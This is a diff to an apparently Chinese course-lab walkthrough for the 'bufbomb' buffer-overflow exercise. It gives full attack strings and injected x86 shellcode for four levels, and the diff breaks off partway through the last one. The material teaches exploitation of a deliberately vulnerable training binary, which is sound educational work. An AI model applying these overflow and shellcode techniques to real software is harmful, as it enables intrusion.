@@ -20,11 +20,17 @@
 └──────────────────┘
 ```
 
-关键指令：
-- `push X`：把 X 压入栈，ESP 减 4
-- `pop X`：从栈顶弹出给 X，ESP 加 4
-- `call func`：把下一条指令的地址压栈（返回地址），然后跳转到 func
-- `ret`：从栈顶弹出一个地址，跳转过去（return）
+关键指令和对应的机器码：
+
+| 指令 | 作用 | 机器码示例 |
+|------|------|-----------|
+| `push X` | 把 X 压入栈，ESP 减 4 | `push ebx` = `53`，`push 0x401260` = `68 60 12 40 00` |
+| `pop X` | 从栈顶弹出给 X，ESP 加 4 | `pop ebx` = `5B`，`pop ebp` = `5D` |
+| `call func` | 把下一条指令地址压栈，跳转到 func | `call 0x401130` = `E8 XX XX XX XX` |
+| `ret` | 从栈顶弹出一个地址，跳转过去 | `C3` |
+| `mov eax, [addr]` | 把内存 addr 处的值加载到 EAX | `A1 XX XX XX XX` |
+| `mov [addr], eax` | 把 EAX 的值写入内存 addr | `A3 XX XX XX XX` |
+| `nop` | 什么都不做 | `90` |
 
 ### 0.2 什么是缓冲区溢出
 
@@ -51,18 +57,18 @@ x86 CPU 用**小端序**存储数据：最低字节存在最低地址。
 | 第1关 | 跳到 `Trojan1()` | 覆盖返回地址 |
 | 第2关 | 跳到 `Trojan2(cookie)` | 覆盖返回地址 + 构造栈参数 |
 | 第3关 | 跳到 `Trojan3()`，但先执行注入的代码 | 注入 shellcode |
-| 第4关 | 同第3关，但函数返回后程序不能崩溃 | shellcode + 恢复栈帧 |
+| 第4关 | 同第3关，但函数返回后程序不能崩溃 | shellcode + 逆序执行法 |
 
 ---
 
 ## 一、准备工作
 
-### 1.1 运行程序获取 cookie
+### 1.1 运行程序获取通行密码
 
-程序用你的学号初始化一个伪随机数生成器，算出 `cookie` 值。每个学号对应唯一的 cookie。
+程序用你的学号初始化一个伪随机数生成器，算出 `cookie` 值（通行密码）。每个学号对应唯一的 cookie。
 
 ```bash
-echo "" | ./bufbomb.exe 720028
+echo "" | ./bufbomb.exe 你的学号后6位
 ```
 
 输出中会看到：
@@ -73,588 +79,475 @@ echo "" | ./bufbomb.exe 720028
 
 **记住这个值**：`cookie = 0x2F3426A6`，小端序 = `A6 26 34 2F`。
 
-### 1.2 getbuf 的栈帧布局（从 IDA / GDB 反汇编得到）
+### 1.2 在反汇编中查找关键地址
 
-用 GDB 在 `getbuf` 内部设断点（地址 `0x00401136` 是 `lea eax, [ebp-0xc]`），可以看到：
+用 IDA Pro 打开 `bufbomb.exe`，或直接打开 `bufbomb_disasm.txt`（已生成的完整反汇编文件），查找以下地址：
+
+| 项目 | 地址 | 在反汇编中怎么找 |
+|------|------|----------------|
+| `getbuf` | `0x00401130` | 搜 `push ebp` 后面紧跟 `sub esp, 0Ch`，再后面 `lea eax, [ebp-0Ch]` |
+| `test` | `0x00401150` | 搜 `mov [ebp-4], 0DEADBEEFh`（那只金丝雀） |
+| `Trojan1` | `0x004011F0` | 搜 "恭喜" 的字符串地址引用 |
+| `Trojan2` | `0x00401210` | 紧接 Trojan1 后面，开头 `push ebx; mov ebx, [esp+8]` |
+| `Trojan3` | `0x00401260` | 紧接 Trojan2 后面，开头 `push ebx; mov ebx, ds:0x409004` |
+| `Trojan4` | `0x004012B0` | 紧接 Trojan3 后面，开头同样是 `push ebx; mov ebx, ds:0x409004`，但结尾是 `pop ebx; ret`（不是 exit） |
+| `cookie` | `0x00409000` | 搜 `ds:0x409000`，出现在 `cmp ebx, ds:0x409000` 中 |
+| `global_value` | `0x00409004` | 搜 `ds:0x409004`，出现在 `mov ebx, ds:0x409004` 中 |
+| test 中 `call getbuf` 的返回点 | `0x00401181` | 在 test 的反汇编中找 `call 0x00401130`，紧接其后的那条指令 |
+| test 的返回点（回 main） | `0x0040140D` | 在 main 中找 `call 0x00401150`，紧接其后的 `xor eax, eax` |
+
+### 1.3 getbuf 的栈帧布局
+
+在 `getbuf` 的反汇编中可以看到：
+
+```asm
+push ebp              ; 保存旧 EBP
+mov  ebp, esp         ; EBP = 当前栈顶
+sub  esp, 0Ch         ; 向下开辟 12 字节空间给 buf
+lea  eax, [ebp-0Ch]   ; eax = buf 起始地址 = EBP - 0xC
+push eax              ; 把 buf 地址作为参数
+call  getxs           ; 调用 getxs(buf) 读取输入
+```
+
+对应栈帧布局：
 
 ```
 低地址 (栈顶)
   ┌──────────────┐
-  │  buf[0]      │  ← ebp-0x0C  (你输入的第1个字节写在这里)
-  │  buf[1]      │
-  │  ...         │
-  │  buf[11]     │  ← ebp-0x01  (你输入的第12个字节)
+  │  buf[0..11]  │  ← EBP-0x0C  (你输入的 前 12 字节 写在这里)
   ├──────────────┤
-  │  保存的 ebp   │  ← ebp+0x00  (4 字节，test 函数的 ebp)
+  │  保存的 EBP   │  ← EBP+0x00  (4 字节，第 13~16 字节覆盖这里)
   ├──────────────┤
-  │  返回地址     │  ← ebp+0x04  (4 字节，正常应回到 test)
+  │  返回地址     │  ← EBP+0x04  (4 字节，第 17~20 字节覆盖这里)
   ├──────────────┤
-  │  ...         │  ← ebp+0x08 及以上属于 test 的栈帧
+  │  ...         │  ← EBP+0x08 及以上属于 test 的栈帧
   └──────────────┘
 高地址 (栈底)
 ```
 
-**关键**：从 `buf[0]` 到返回地址的偏移 = 12（buf 本身）+ 4（保存的 ebp）= **16 字节**。
+**关键**：前 12 字节填 buf，第 13~16 字节覆盖保存的 EBP，**第 17~20 字节覆盖返回地址**。
 
-所以攻击字符串的**第 17~20 字节**（索引 16~19）会覆盖返回地址。
+### 1.4 用 IDA 调试器获取栈地址（第3、4关需要）
 
-### 1.3 关键地址（IDA / objdump 反汇编 bufbomb.exe 所得）
+第3、4关需要跳转到 buf 来执行注入的代码，所以必须知道 buf 在内存中的确切地址。
 
-| 项目 | 地址 |
-|------|------|
-| `getbuf` 函数 | `0x00401130` |
-| `test` 函数（getbuf 的调用者） | `0x00401150` |
-| `Trojan1` 函数 | `0x004011F0` |
-| `Trojan2` 函数 | `0x00401210` |
-| `Trojan3` 函数 | `0x00401260` |
-| `Trojan4` 函数 | `0x004012B0` |
-| `cookie` 全局变量 | `0x00409000` |
-| `global_value` 全局变量 | `0x00409004` |
-| `test` 中 `call getbuf` 的返回点 | `0x00401181` |
+**在 IDA Pro 中操作**：
 
-> **如何验证这些地址？** 用 objdump 反汇编：
-> ```bash
-> objdump -d -M intel --start-address=0x004011f0 --stop-address=0x00401210 bufbomb.exe
-> ```
-> 输出应该能看到 `push 0x40730b` 等字符串地址，对应 Trojan1 里的 printf 调用。
+1. **设置参数**：菜单 Debugger → Process options → Parameters 填入你的学号后6位
+2. **设断点**：在 getbuf 的 `push ebp`（地址 `0x00401130`）处按 F2 设断点
+3. **运行**：按 F9 启动调试，程序会停在断点处
+4. **单步**：按 F7 执行到 `sub esp, 0Ch` 之后
+5. **读 EBP**：在 General Registers 窗口看到 EBP 的值（例如 `0x001AFE30`）
+6. **读栈内容**：打开 Stack view，从 EBP 对应的地址开始查看
 
-### 1.4 用 GDB 获取 buf 的栈地址（第3、4关需要）
-
-第3、4关需要在栈上执行代码，所以必须知道 `buf` 的确切内存地址。
-
-```bash
-# 1. 创建 GDB 脚本
-cat > gdb_cmds.txt << 'EOF'
-set args 720028
-break *0x00401136
-run
-info registers eax esp ebp
-x/12xw $ebp
-quit
-EOF
-
-# 2. 运行 GDB
-echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" | gdb -batch -nx -x gdb_cmds.txt bufbomb.exe
-```
-
-输出关键信息：
+以学号 720028 为例，你会看到：
 
 ```
-eax            0x1afe38
-esp            0x1afe24
-ebp            0x1afe30
+EBP = 0x001AFE30
 
-0x1afe30:  0x001afe48  0x00401181  0x0000006c  0x00401177
-0x1afe40:  0x00000002  0xdeadbeef  0x001aff3c  0x0040140d
+栈内容（从 EBP 开始）：
+地址        值           含义
+0x001AFE30  0x001AFE48   ← 保存的 EBP = test 的 EBP
+0x001AFE34  0x00401181   ← 当前返回地址（test 中 call getbuf 后的下一条指令）
+0x001AFE38  0x0000006C   ← test 的 alloca 缓冲区（'l' = 0x6C）
+0x001AFE3C  0x00401177   ← test 的其他局部数据
+0x001AFE40  0x00000002   ← test 的其他局部数据
+0x001AFE44  0xDEADBEEF   ← 金丝雀 bird！
+0x001AFE48  0x001AFF3C   ← test 保存的 EBP = main 的 EBP
+0x001AFE4C  0x0040140D   ← test 的返回地址（回 main）
 ```
 
-解读：
-- `ebp = 0x001AFE30`：getbuf 的栈帧基址
-- `[ebp] = 0x001AFE48`：**test 的 EBP**（保存的 ebp）
-- `[ebp+4] = 0x00401181`：当前返回地址（指向 test 中 `call getbuf` 的下一条指令）
-- `buf 地址 = ebp - 0xC = 0x001AFE24`
+从中可以计算出：
 
-从这个栈转储还能读出 test 栈帧的完整信息：
-
-| 地址 | 值 | 含义 |
-|------|------|------|
-| `0x001AFE24` | — | buf 起始地址 |
-| `0x001AFE30` | `0x001AFE48` | getbuf 保存的 ebp = **test 的 EBP** |
-| `0x001AFE34` | `0x00401181` | getbuf 的返回地址 |
-| `0x001AFE38` | `0x0000006C` | test 的 alloca 缓冲区（`'l'` = 0x6C） |
-| `0x001AFE44` | `0xDEADBEEF` | test 的 **bird 变量** |
-| `0x001AFE48` | `0x001AFF3C` | test 保存的 ebp = **main 的 EBP** |
-| `0x001AFE4C` | `0x0040140D` | test 的返回地址（回到 main） |
+| 需要的值 | 计算方法 | 示例值 |
+|---------|---------|--------|
+| buf 起始地址 | EBP - 0xC | 0x001AFE30 - 0xC = **0x001AFE24** |
+| test 的 EBP | 栈中 [EBP] 的值 | **0x001AFE48** |
+| bird 的地址 | test 的 EBP - 4 | **0x001AFE44** |
+| main 的 EBP | 栈中 [test的EBP] 的值 | **0x001AFF3C** |
+| test 返回 main 的地址 | 栈中 [test的EBP + 4] | **0x0040140D** |
 
 ---
 
-## 二、第1关：Trojan1 — 修改返回地址
+## 二、第1关：覆盖返回地址跳转到 Trojan1
 
-### 2.1 目标
+### 目标
 
 让 `getbuf()` 返回时不回到 `test()`，而是跳到 `Trojan1()`。
 
-### 2.2 思路
+### 原理
 
-`getbuf` 执行 `ret` 时，CPU 从栈上弹出返回地址并跳转过去。如果我把栈上的返回地址改成 `Trojan1` 的地址，`ret` 就会直接跳到 `Trojan1`。
+`getbuf` 结束时执行 `ret`，CPU 从栈上弹出返回地址并跳转。我们只要把返回地址覆盖成 Trojan1 的地址就行。
 
-### 2.3 构造攻击字符串
+### 构造
 
 ```
-字节 0~11:   随意填充 buf（12 字节，用 00）
-字节 12~15:  覆盖保存的 ebp（4 字节，随意填 00，反正 Trojan1 会调用 exit(0)）
-字节 16~19:  覆盖返回地址 = Trojan1 地址
+前 12 字节（偏移 0~11）：00 填充 buf
+接下来 4 字节（偏移 12~15）：00 随意覆盖保存的 EBP（Trojan1 会 exit(0)，不care）
+最后 4 字节（偏移 16~19）：Trojan1 的地址，小端序
 ```
 
-Trojan1 地址 = `0x004011F0`，小端序 = `F0 11 40 00`。
+Trojan1 地址 = `0x004011F0` → 小端序 = `F0 11 40 00`
 
-### 2.4 攻击字符串
+### 答案
 
 ```
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00
 ```
 
-共 **20 字节**。
+共 20 字节。
 
-### 2.5 测试
+### 测试
 
 ```bash
 echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00" | ./bufbomb.exe 720028
 ```
 
-**预期输出**（出现即通过）：
-
-```
-恭喜你！你已经成功偷偷运行了第1只木马!
-通过第1只木马测试
-```
-
-### 2.6 为什么能通过
-
-`getbuf` 返回时：
-1. `mov esp, ebp`：恢复 ESP
-2. `pop ebp`：弹出保存的 ebp（被覆盖成 00 00 00 00，无所谓）
-3. `ret`：从栈顶弹出 4 字节 `F0 11 40 00` = `0x004011F0`，跳转到 Trojan1
-
-Trojan1 打印通关信息后调用 `exit(0)` 直接结束程序，不需要返回，所以 ebp 被破坏也无所谓。
+预期输出：`恭喜你！你已经成功偷偷运行了第1只木马!` + `通过第1只木马测试`
 
 ---
 
-## 三、第2关：Trojan2(cookie) — 覆盖返回地址 + 构造栈参数
+## 三、第2关：跳转到 Trojan2 并传递通行密码
 
-### 3.1 目标
+### 目标
 
-跳到 `Trojan2(val)`，并且让参数 `val` 等于 `cookie`。
+跳到 `Trojan2(val)`，并且让参数 `val` 等于 cookie（通行密码）。
 
-### 3.2 思路
+### 原理
 
-第1关只改了返回地址。第2关还需要在栈上**放好参数**。
+第1关只覆盖了返回地址。第2关还需要在栈上**放好参数**。
 
-先看 Trojan2 的反汇编：
+看 Trojan2 的反汇编：
 
 ```asm
 push ebx                  ; 保存 ebx
-mov  ebx, [esp+0x8]       ; 从栈上读取参数 val ← 关键！
+mov  ebx, [esp+8]         ; 从栈上读参数 val
 cmp  ebx, ds:0x409000     ; 与 cookie 比较
 ```
 
-Trojan2 从 `[esp+0x8]` 读参数。为什么是 `esp+0x8` 而不是 `esp+0x4`？
-
-因为 `ret` 弹出返回地址后 ESP 已经上移了 4 字节，然后 `push ebx` 又下移了 4 字节。所以 `[esp+0x8]` 对应的位置是：
+它从 `[esp+8]` 读参数。为什么不是 `[esp+4]`？因为 `ret` 弹出返回地址后 ESP 已经上移了 4 字节，然后 `push ebx` 又下移了 4 字节：
 
 ```
-                          ESP → ┌──────────────┐
-push ebx 保存的旧 ebx           │  旧 ebx       │  ← esp+0x0
-                                 ├──────────────┤
-ret 弹出的返回地址（跳到这）      │  返回地址      │  ← esp+0x4
-                                 ├──────────────┤
-                                 │  参数 val      │  ← esp+0x8  ← 我们要控制这个
-                                 └──────────────┘
+                     ESP → ┌──────────────┐
+push ebx 保存的旧 ebx       │  旧 ebx       │  ← esp+0
+                            ├──────────────┤
+ret 弹出的返回地址           │  返回地址      │  ← esp+4
+                            ├──────────────┤
+                            │  参数 val      │  ← esp+8  ← 我们要控制这个
+                            └──────────────┘
 ```
 
-所以在攻击字符串中，**返回地址后面 4 字节放 Trojan2 的返回地址**（无所谓，它会 exit），**再后面 4 字节放 cookie**。
+所以返回地址之后还要再放 8 字节：4 字节假返回地址 + 4 字节 cookie。
 
-### 3.3 构造攻击字符串
+### 构造
 
 ```
-字节 0~11:   填充 buf（12 字节）
-字节 12~15:  覆盖保存的 ebp（4 字节，随意）
-字节 16~19:  返回地址 = Trojan2 = 0x00401210 → 10 12 40 00
-字节 20~23:  Trojan2 的返回地址（无所谓，Trojan2 会 exit(0)）→ 00 00 00 00
-字节 24~27:  参数 val = cookie = 0x2F3426A6 → A6 26 34 2F
+前 16 字节：同第1关（填充 buf + 覆盖 EBP）
+接下来 4 字节（偏移 16~19）：Trojan2 地址 → 10 12 40 00
+接下来 4 字节（偏移 20~23）：假返回地址，全零即可（Trojan2 会 exit(0)）
+最后 4 字节（偏移 24~27）：通行密码，小端序 → A6 26 34 2F
 ```
 
-### 3.4 攻击字符串
+### 答案
 
 ```
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F
 ```
 
-共 **28 字节**。
+共 28 字节。
 
-### 3.5 测试
+> **如果你的学号不同**：只有最后 4 字节不同。运行一次程序看你的 cookie，转成小端序替换。例如 cookie = `0x12345678` → 末尾改成 `78 56 34 12`。
+
+### 测试
 
 ```bash
 echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F" | ./bufbomb.exe 720028
 ```
 
-**预期输出**：
-
-```
-不错哦！第2只木马运行了，而且通行密码是正确的！(0X2F3426A6)
-通过第2只木马测试
-```
-
-### 3.6 如果你的学号不同
-
-只有最后 4 字节（cookie 值）不同。先运行一次程序看你的 cookie，然后把 cookie 转成小端序替换。
-
-例如你的 cookie 是 `0x12345678`，小端序 = `78 56 34 12`，攻击字符串末尾就是 `78 56 34 12`。
+预期输出：`不错哦！第2只木马运行了，而且通行密码是正确的！(0X2F3426A6)`
 
 ---
 
-## 四、第3关：Trojan3 — 在栈上注入并执行代码
+## 四、第3关：注入代码将 cookie 写入 global_value 并跳转到 Trojan3
 
-### 4.1 目标
+### 目标
 
 在栈上注入一段机器码（shellcode），让它：
 1. 把 `cookie` 的值加载到 EAX
 2. 把 EAX 存入 `global_value`
 3. 跳转到 `Trojan3`
 
-然后覆盖返回地址，让 `ret` 跳到栈上的 shellcode。
+然后覆盖返回地址，让 getbuf 的 `ret` 跳到栈上的 shellcode 来执行。
 
-### 4.2 思路
+### 原理
 
-第1、2关只改了栈上的数据（地址、参数）。第3关更进一步：**把可执行的机器指令放在栈上，然后跳过去执行**。
+前两关只改了栈上的数据（地址、参数）。第3关更进一步：**把可执行的机器指令直接写在栈上，然后让程序跳过去执行**。
 
-这要求栈内存是**可执行**的（没有 DEP 保护）。本实验的 `bufbomb.exe` 没有开启 DEP，所以栈上的代码可以直接运行。
+本实验的 `bufbomb.exe` 没有开启 DEP（数据执行保护），所以栈上的代码可以直接运行。
 
-### 4.3 设计 Shellcode
+### 设计 Shellcode
 
-需要的操作：
+把下面的汇编翻译成机器码：
 
 ```asm
-MOV EAX, [0x409000]       ; 把 cookie 加载到 EAX
-MOV [0x409004], EAX       ; 把 EAX 存入 global_value
-PUSH 0x00401260           ; 把 Trojan3 地址压栈
-RET                       ; 弹出 Trojan3 地址并跳转
+mov eax, [0x409000]       ; 从 cookie 地址加载值到 EAX     → A1 00 90 40 00
+mov [0x409004], eax       ; 把 EAX 写入 global_value 地址   → A3 04 90 40 00
+push 0x00401260           ; 把 Trojan3 地址压入栈          → 68 60 12 40 00
+ret                       ; 弹出 Trojan3 地址并跳转         → C3
 ```
-
-每条指令的机器码（用 x86 32位编码）：
-
-| 指令 | 机器码 | 字节数 |
-|------|--------|--------|
-| `MOV EAX, [0x409000]` | `A1 00 90 40 00` | 5 |
-| `MOV [0x409004], EAX` | `A3 04 90 40 00` | 5 |
-| `PUSH 0x00401260` | `68 60 12 40 00` | 5 |
-| `RET` | `C3` | 1 |
 
 共 **16 字节**。
 
-### 4.4 放置 Shellcode
+### 放置 Shellcode
 
-buf 只有 12 字节，shellcode 有 16 字节。解决方法：**让 shellcode 覆盖 buf + saved_ebp**。
+buf 只有 12 字节，shellcode 有 16 字节。恰好可以覆盖 buf（12 字节）+ 保存的 EBP（4 字节）= 16 字节。因为 Trojan3 会调用 `exit(0)` 直接退出，所以覆盖 EBP 也无所谓。
 
 ```
-字节 0~11:   shellcode 前 12 字节（覆盖 buf）
-字节 12~15:  shellcode 后 4 字节（覆盖保存的 ebp，无所谓，Trojan3 会 exit）
-字节 16~19:  返回地址 = buf 的栈地址 = 0x001AFE24 → 24 FE 1A 00
+前 16 字节（偏移 0~15）：shellcode（刚好覆盖 buf + 保存的 EBP）
+最后 4 字节（偏移 16~19）：buf 的栈地址（让 ret 跳回 buf 开头执行 shellcode）
 ```
 
-`ret` 会跳到 `0x001AFE24`，也就是 buf 的开头，开始执行 shellcode。
+buf 的栈地址需要用 [1.4 节](#14-用-ida-调试器获取栈地址第34关需要) 的方法在 IDA 调试器中获取。以 720028 为例，buf = `0x001AFE24`，小端序 = `24 FE 1A 00`。
 
-### 4.5 攻击字符串
+### 答案
 
 ```
 A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00
 ```
 
-共 **20 字节**。分解：
+共 20 字节。分解：
 
 ```
-A1 00 90 40 00     ← MOV EAX, [cookie]
-A3 04 90 40 00     ← MOV [global_value], EAX
-68 60 12 40 00     ← PUSH Trojan3
-C3                 ← RET
+A1 00 90 40 00     ← mov eax, [cookie]（把 cookie 值加载到 EAX）
+A3 04 90 40 00     ← mov [global_value], eax（把 EAX 写入 global_value）
+68 60 12 40 00     ← push Trojan3（把 Trojan3 地址压栈）
+C3                 ← ret（弹出 Trojan3 地址，跳转过去）
 24 FE 1A 00        ← 返回地址 = buf 栈地址（0x001AFE24 的小端序）
 ```
 
-### 4.6 测试
+> **如果你的学号不同**：只有最后 4 字节（buf 栈地址）不同。用 IDA 调试器获取你自己的 EBP，buf = EBP - 0xC，转成小端序替换。
+
+### 测试
 
 ```bash
 echo "A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00" | ./bufbomb.exe 720028
 ```
 
-**预期输出**：
-
-```
-厉害！第3只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6
-通过第3只木马测试
-```
-
-### 4.7 如果你的学号不同
-
-只有最后 4 字节（buf 栈地址）不同。用 [1.4 节](#14-用-gdb-获取-buf-的栈地址第34关需要) 的方法获取你自己的 buf 地址，转成小端序替换最后 4 字节。
+预期输出：`厉害！第3只木马运行了，而且你修改了全局变量正确！global_value = 0X2F3426A6`
 
 ---
 
-## 五、第4关：Trojan4 — Shellcode + 恢复栈帧
+## 五、第4关：注入代码 + 保持栈帧完好
 
-### 5.1 目标
+### 目标
 
-与第3关类似：注入 shellcode 设置 `global_value = cookie`，然后跳到 `Trojan4`。但 `Trojan4` 不调用 `exit(0)`，而是 **`return`** 返回。程序必须继续正常运行，最终输出"鸟还活着！"。
+与第3关类似：注入 shellcode 设置 `global_value = cookie`。但 Trojan4 不调用 `exit(0)`，而是 **`return`** 返回。程序必须继续正常运行：test 检查金丝雀 bird 不死、getbuf 返回值正确，最后 Trojan4 输出通关信息。
 
-### 5.2 难在哪
+### 难在哪
 
-第3关的 Trojan3 调用 `exit(0)` 直接终止程序，所以不用管栈帧被破坏的问题。
+第3关的 Trojan3 调用 `exit(0)` 直接终止程序，覆盖了什么无所谓。
 
-第4关的 Trojan4 执行 `pop ebx; ret` 返回后，控制流回到 `test()` 函数。`test()` 会：
+第4关的 Trojan4 只是 `pop ebx; ret` 返回，控制流回到 test。test 会检查：
 
 ```c
-if (bird == 0xdeadbeef) {        // 检查 bird 是否被破坏
-    printf("鸟还活着！\n");
-}
-// ... 然后正常返回 main
+if (bird == 0xdeadbeef) { printf("鸟还活着！\n"); }  // 金丝雀不能死
+if (val == cookie)       { printf("不错哦！...\n"); }  // 返回值必须是 cookie
 ```
 
-`bird` 在 `test()` 的栈帧上（地址 `ebp-4`）。如果我们的溢出破坏了 `test` 的 EBP 或 `bird`，程序就会崩溃。
+如果溢出破坏了 test 的 EBP、bird 或返回地址，程序就会崩溃。
 
-### 5.3 第3关的方法为什么不行
+### 解决方案：逆序执行法
 
-第3关把 16 字节 shellcode 放在 `buf + saved_ebp` 区域。这会覆盖：
-- `saved_ebp`（test 的 EBP）→ 被覆盖成 shellcode 的字节 `12 40 00 C3`
-
-Trojan4 返回后，`test()` 的 EBP 指向垃圾地址，访问 `[ebp-4]`（bird）就会读写到错误的内存，导致崩溃。
-
-### 5.4 解决方案：Trampoline（跳板）技术
-
-**核心思想**：不在 buf 开头放 shellcode，而是放一条短跳转指令（JMP），跳到栈上更高地址处的 shellcode。中间留出空间来**保留 test 栈帧中的关键数据**。
-
-完整的攻击字符串布局（70 字节）：
+**核心思想**：让 shellcode 先设好 EAX = cookie 和 global_value = cookie，然后 RET 回 test 正常执行。test 检查通过后，通过被覆盖的返回地址"顺便"跳到 Trojan4。Trojan4 的 `pop ebx; ret` 自然弹出下一个栈上值，回到 main。
 
 ```
-字节  0~4:    JMP +0x27（跳到字节 44 的 shellcode）
-字节  5~11:   填充（凑够 buf 的 12 字节）
-字节 12~15:   保存 test 的 EBP = 0x001AFE48 → 48 FE 1A 00
-字节 16~19:   返回地址 = buf 栈地址 = 0x001AFE24 → 24 FE 1A 00
-字节 20~23:   Trojan4 返回后跳到 fixup 代码 = 0x001AFE60 → 60 FE 1A 00
-字节 24~31:   填充（覆盖 test 的 alloca 缓冲区）
-字节 32~35:   恢复 bird = 0xDEADBEEF → EF BE AD DE
-字节 36~39:   恢复 test 的 saved_ebp = main 的 EBP = 0x001AFF3C → 3C FF 1A 00
-字节 40~43:   恢复 test 的返回地址 = 0x0040140D → 0D 14 40 00
-字节 44~59:   Shellcode（16 字节）
-字节 60~69:   Fixup 代码：设置 EAX = cookie 后跳回 test（10 字节）
+执行顺序：getbuf → shellcode → test（检查通过）→ Trojan4（输出通关）→ main（正常结束）
 ```
 
-### 5.5 对应到内存地址
+优势：
+1. shellcode 只有 `MOV; MOV; NOP; RET` 共 12 字节，刚好填满 buf，不溢出到 saved_ebp
+2. 不需要额外的 fixup 代码（EAX 在 test 之前就设好了）
+3. 总长度 44~48 字节，比跳板法的 70 字节短得多
 
-攻击字符串从 `0x001AFE24`（buf 起始）开始写入：
-
-```
-地址        | 字节偏移 | 内容               | 对应栈结构
-------------|----------|--------------------|--------------------
-0x001AFE24  |  0~4     | JMP shellcode      | ← buf[0..4]
-0x001AFE29  |  5~11    | 00 填充            | ← buf[5..11]
-0x001AFE30  | 12~15    | 48 FE 1A 00        | ← saved_ebp（test 的 EBP）
-0x001AFE34  | 16~19    | 24 FE 1A 00        | ← 返回地址
-0x001AFE38  | 20~23    | 60 FE 1A 00        | ← Trojan4 返回后跳到 fixup
-0x001AFE3C  | 24~27    | 00 00 00 00        | ← alloca 缓冲区
-0x001AFE40  | 28~31    | 00 00 00 00        | ← alloca 缓冲区 / saved_esi
-0x001AFE44  | 32~35    | EF BE AD DE        | ← bird（必须保持 DEADBEEF！）
-0x001AFE48  | 36~39    | 3C FF 1A 00        | ← test 的 saved_ebp（main 的 EBP）
-0x001AFE4C  | 40~43    | 0D 14 40 00        | ← test 的返回地址（回到 main）
-0x001AFE50  | 44~59    | shellcode          | ← 注入的代码
-0x001AFE60  | 60~69    | fixup              | ← EAX=cookie 后跳回 test
-```
-
-### 5.6 执行流程详解
-
-**第一步：getbuf 返回，跳到 JMP**
-
-```
-getbuf 的 ret → 弹出返回地址 0x001AFE24 → 跳到 buf 开头
-```
-
-**第二步：JMP 跳过敏感区域，到达 shellcode**
-
-```
-JMP +0x27 → 跳到 0x001AFE50（shellcode 所在地）
-跳过了中间的 saved_ebp、bird 等需要保护的区域
-```
-
-**第三步：shellcode 执行**
-
-```
-MOV EAX, [0x409000]       ; EAX = cookie
-MOV [0x409004], EAX       ; global_value = cookie
-PUSH 0x004012B0           ; 压入 Trojan4 地址
-RET                       ; 跳转到 Trojan4
-```
-
-**第四步：Trojan4 执行并返回到 fixup**
-
-```
-Trojan4 打印通关信息
-Trojan4 执行 pop ebx; ret → 回到 fixup 代码（0x001AFE60）
-```
-
-**第五步：fixup 代码修复 EAX**
-
-Trojan4 内部的 printf 会把 EAX 改成 printf 的返回值。我们需要 EAX = cookie，这样 test 才会输出"不错哦"。
+### 设计 Shellcode（12 字节）
 
 ```asm
-MOV EAX, 0x2F3426A6      ; B8 A6 26 34 2F  → 手动把 cookie 写入 EAX
-JMP 0x00401181            ; E9 17 13 25 00  → 跳回 test 中 call getbuf 之后
+mov eax, [0x409000]       ; EAX = cookie                → A1 00 90 40 00
+mov [0x409004], eax       ; global_value = cookie        → A3 04 90 40 00
+nop                       ; 占位凑满 12 字节              → 90
+ret                       ; 跳到栈顶指向的地址            → C3
 ```
 
-**第六步：test 继续，检查 bird 和返回值**
+共 **12 字节**，刚好等于 buf 的长度。
+
+### 逐步构造攻击字符串
+
+以学号 **720028** 为例（buf = `0x001AFE24`，test 的 EBP = `0x001AFE48`）：
+
+**偏移 0~11：shellcode（12 字节，填满 buf）**
 
 ```
-test 检查 [ebp-4] == 0xdeadbeef
-  → ebp = 0x001AFE48（正确恢复！）
-  → [ebp-4] = [0x001AFE44] = 0xDEADBEEF（正确恢复！）
-  → 输出 "鸟还活着！"
+A1 00 90 40 00 A3 04 90 40 00 90 C3
 ```
 
-**第七步：test 正常返回 main**
+**偏移 12~15：恢复 test 的 EBP**
+
+getbuf 结束时执行 `pop ebp`，会把这里弹回 EBP。必须填回正确的值，否则 test 的 `[ebp-4]`（bird）会指向错误地址。
+
+用 IDA 调试器查看栈中 [getbuf 的 EBP] 处的值 = test 的 EBP = `0x001AFE48`
 
 ```
-test 的 pop ebp → ebp = [0x001AFE48] = 0x001AFF3C（main 的 EBP，正确恢复！）
-test 的 ret → 跳到 [0x001AFE4C] = 0x0040140D（main 中的返回点，正确恢复！）
-程序正常结束
+48 FE 1A 00
 ```
 
-### 5.7 JMP 偏移量是怎么算的
+**偏移 16~19：返回地址 = buf 起始地址**
 
-JMP rel32 指令编码：`E9` + 4 字节有符号偏移。
-
-偏移 = 目标地址 - (JMP 指令地址 + 5)
+getbuf 的 `ret` 弹出这个地址并跳转。我们要跳到 buf 开头执行 shellcode。buf = EBP - 0xC = `0x001AFE24`
 
 ```
-目标地址（shellcode）= 0x001AFE50
-JMP 指令地址        = 0x001AFE24
-偏移 = 0x001AFE50 - (0x001AFE24 + 5) = 0x001AFE50 - 0x001AFE29 = 0x27
+24 FE 1A 00
 ```
 
-所以 JMP 指令 = `E9 27 00 00 00`。
+**偏移 20~23：shellcode 的 ret 跳转目标**
 
-### 5.8 攻击字符串
+shellcode 的 `ret` 会从栈上弹出一个地址。此时 ESP 指向这里。我们要让它回到 test 中 `call getbuf` 的下一条指令，这样 test 就会正常继续。
 
-```
-E9 27 00 00 00 00 00 00 00 00 00 00 48 FE 1A 00 24 FE 1A 00 60 FE 1A 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 0D 14 40 00 A1 00 90 40 00 A3 04 90 40 00 68 B0 12 40 00 C3 B8 A6 26 34 2F E9 17 13 25 00
-```
-
-共 **70 字节**。分解：
+在反汇编中找 test 里 `call 0x00401130`（call getbuf）后面那条指令的地址 = `0x00401181`
 
 ```
-E9 27 00 00 00     ← JMP 跳到 shellcode
-00 00 00 00 00 00 00
-48 FE 1A 00        ← saved_ebp = test 的 EBP
-24 FE 1A 00        ← 返回地址 = buf 栈地址
-60 FE 1A 00        ← Trojan4 返回后跳到 fixup
+81 11 40 00
+```
